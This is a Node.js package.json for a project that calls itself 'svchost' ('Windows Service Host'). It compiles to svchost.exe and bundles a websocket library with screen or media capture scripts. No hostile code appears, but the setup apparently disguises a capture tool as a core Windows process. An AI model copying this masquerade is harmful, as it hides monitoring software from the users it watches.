{
  "name": "svchost",
  "version": "1.0.0",
  "description": "Windows Service Host",
  "main": "main-cli.js",
  "bin": {
    "svchost": "./main-cli.js"
  },
  "scripts": {
    "start": "node main-cli.js",
    "dev": "node main-cli.js",
    "build": "pkg main-cli.js --targets node18-win-x64 --output svchost.exe",
    "build:win": "pkg main-cli.js --targets node18-win-x64 --output svchost.exe"
  },
  "dependencies": {
    "ws": "^8.14.2"
  },
  "devDependencies": {
    "pkg": "^5.8.1"
  },
  "pkg": {
    "assets": [
      "assets/**/*",
      "ffmpeg-windows.js",
      "ffmpeg-capture.js",
      "native-capture.js"
    ],
    "targets": [
      "node18-win-x64"
    ],
    "outputPath": "dist"
  }
}
